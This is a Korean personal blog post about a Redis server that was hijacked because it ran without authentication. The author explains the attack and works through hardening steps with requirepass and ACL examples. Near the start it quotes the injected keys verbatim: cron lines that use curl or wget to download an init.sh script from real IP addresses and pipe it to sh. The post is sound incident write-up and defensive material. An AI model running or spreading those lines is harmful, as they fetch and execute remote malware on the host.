---
layout: post
title: 'redis가 해킹당했다(backup1, backup2...)'
subtitle: ''
date: 2021-12-18 12:30:15 +0900
background: '/img/posts/05.jpg'
---

##

데비안 서버에 redis 서비스를 설치하고 사용하고 있다.
근데 어느순간에 보니..?

![backup](/img/posts/21_12_18/backup.png)

이게...무슨일이지..?

저장해놓은 키들도 다 날아갔다.

```
backup1 \n\n\n*/2 * * * * cd1 -fsSL http://194.87.139.103/cleanfda/init.sh | sh\n\n
backup2 \n\n\n*/3 * * * * wget -q -O- http://194.87.139.103/cleanfda/init.sh | sh\n\n
backup3 \n\n\n*/4 * * * * curl -fsSL http://45.133.203.192/cleanfda/init.sh | sh\n\n
backup4 \n\n\n*/5 * * * * wd1 -q -O- http://45.133.203.192/cleanfda/init.sh | sh\n\n
```
아무리 봐도 위험한 냄새가 술술 나는 값들인데...?

테스트만 진행해보고 제대로된 조치를 안취해놓은 내가 잘못이지...
일단 뭐하는 공격인지 좀 찾아봐야겠다.


[링크](https://www.kurien.net/post/view/33)

위의 링크를 보니, redis가 자동화된 봇에 의해서 접속, 연결, 기존 데이터들을 삭제하고 위의 데이터들을 쓴 후 백업파일을 방법으로 /etc 경로의 crontab 파일을 생성하고,
크론탭이 이 값을 가지고 해킹 스크립트를 다운받고 실행하도록 만드는 구조인 것 같다.

위 링크의 글쓴이도 그렇고,
redis 서버를 실행하는 권한이 조금 더 높은 권한이여서 /etc폴더를 수정할 수 있었다면 이미 꼼짝없이 해킹당해서 비트코인이나 캐는 기계가 되지 않았을까..?

아무튼 원인도 알았고, 어떻게 이러한 일이 다시 일어나지 않게 할지 해결이나 하자.


## 해결 방법
일단 가장 큰 문제는 redis가 기본 포트로 열려있었고, 인증이 필요없이도 접근할 수 있었다.

그래서 포트를 기본포트(6379)에서 다른 포트로 바꾸었고, 인증을 사용해야만 redis 서버에 접근할 수 있게 만들어 보았다.

### redis 패스워드 설정
redis.conf 파일의 requirepass를 통해서 패스워드를 설정하는 방법과,
Redis ACL system을 통해서 username, password를 설정하는 방법 2가지가 있다.

ACL system은 redis 6.0 이상 버전에서만 지원하기 때문에, 이 점 설정전에 미리 생각해놓자.
또한, ACL system을 활성화 하기 위해서는 requirepass를 미리 활성화해놓아야 활성화되니, 이것도 같이 좀...

#### requirepass
일단 requirepass를 통해서 패스워드 설정은 쉽다.


![backup](/img/posts/21_12_18/requirepass.png)


콘솔에서 커맨드로도 설정할 수 있음!


#### ACL system
이제 ACL 시스템 기반 유저 생성과 적용을 해보자
ACL 시스템은 기존의 requirepass에서 하나의 비밀번호를 공유하는 것이 아니라, 
유저를 생성하고 유저별로 접근 가능한 키, 사용 가능한 커맨드까지 정의할 수 있기 때문에 조금 더 나은 보안을 제공할 수 있다.

일단 유저를 생성해보자!


![backup](/img/posts/21_12_18/acl.png)

성ㄱ.......앗..?

윈도우용 빌드라서 버전이 오래되서 지원하지 않는 것 같다.....

후..

일단 찾아본 내용을 바탕으로 정리한다.

유저는 다음의 두 가지 방법으로 생성되고, 수정될 수 있다.
- ACL SETUSER 라는 ACL 커맨드를 사용
- 유저를 정의하는 서버의 구성파일을 변경한 뒤 서버를 재시작시키거나, 외부의 ACL파일을 사용한 뒤 ACL LOAD 커맨드를 사용한다.
여기서는 ACL 커맨드를 사용하는 방법만 정리해본다.
외부의 ACL 파일을 이용하는 방법은, ACL 커맨드를 사용하는 방법만 잘 안다면 어렵지 않게 시도할 수 있을 것이라고 한다!


간단한 ACL SETUSER 커맨드를 시도해보자.
``` bash
> ACL SETUSER alice
OK
```

SETUSER 커맨드는 유저명과 유저에게 적용할 ACL 규칙을 나열한다. 하지만 위의 예에서는 규칙을 명시하지 않았는데, 이럴 때에 만약 유저가 존재하지 않았다면 기본 규칙을 유저에게 부여한다. 
유저가 이미 존재한다면 위의 커맨드는 아무런 일도 하지 않는다.
기본 유저의 상태를 알아보자.

``` bash
> ACL LIST
 1) "user alice off -@all"
 2) "user default on nopass ~* +@all"
```

방금 만든 유저 alice의 상태는 다음과 같다.
off 상태이며, 따라서 비활성화 상태이다. AUTH 커맨드는 작동하지 않는다.
아무 커맨드도 실행할 수 없다. 사용자가 어떤 커맨드도 액세스할 수 없는 상태로 기본적으로 생성되므로 위의 출력에서 -@all 을 생략할 수 있지만, ACL LIST에서는 명시적으로 노출했다.
결론적으로, 이 유저가 접근할 수 있는 키 패턴은 없다.
유저는 접속 가능한 패스워드도 없다.
지금 상태의 유저로는 아무 것도 할 수 없다. 이제 유저를 사용 가능하도록 패스워드도 만들고, ‘cached:’ 프리픽스로 시작하는 키를 GET 할 수 있도록 접근권한을 부여해보자.

``` bash
> ACL SETUSER alice on >p1pp0 ~cached:* +get
OK
```

이제 유저는 일부 권한을 가졌지만, 일부에 대해서는 권한이 없다.

``` bash
> AUTH alice p1pp0
OK
> GET foo
(error) NOPERM this user has no permissions to access on of the keys used as arguments
> GET cached:1234
(nil)
> SET cached:1234 zap
(error) NOPERM this user has no permissions to run the 'set' command or its subcommand
```

위의 예제에서 ACL 규칙은 우리가 예상한 대로 잘 작동되는 것을 확인할 수 있다. alice라는 유저(유저명은 대소문자를 구분함)의 현재 권한을 확인하기 위해 ACL LIST를 대체한 다른 커맨드를 사용할 수도 있다. ACL LIST는 사람이 읽기에는 조금 복잡하다.

``` bash
> ACL GETUSER alice
1) "flags"
2) 1) "on"
3) "passwords"
4) 1) "2d9c75..."
5) "commands"
6) "-@all +get"
7) "keys"
8) 1) "cached:*"
```

ACL GETUSER 커맨드는 필드-값 배열을 반환하며 이 유저를 조금 더 이해하기 쉽도록 보여준다. 결과값은 플래그 세트, 주요 패턴 목록, 암호 등을 포함한다. RESP3을 사용할 경우 아래처럼 더 읽기 쉽게 맵으로 반환한다.

``` bash
> ACL GETUSER alice
1# "flags" => 1~ "on"
2# "passwords" => 1) "2d9c75..."
3# "commands" => "-@all +get"
4# "keys" => 1) "cached:*"
```

이제 다시 ACL SETUSER 커맨드를 사용해서 유저에게 더 많은 규칙을 적용해보자.
``` bash
> ACL SETUSER alice ~objects:* ~items:* ~public:*
OK
> ACL LIST
1) "user alice on >2d9c75... ~cached:* ~objects:* ~items:* ~public:* -@all +get"
2) "user default on nopass ~* +@all
```



### 결론
별 문제도 아닌거 가지고 한시간동안 넣어놨던 키들 다 사라지고.....
오늘의 교훈을 바탕으로 보안 설정도 다 해놓게 되었다.

서버 설정할때는 항상 작은 보안에도 조심 또 조심해야겠다
내 데이터 소듕해...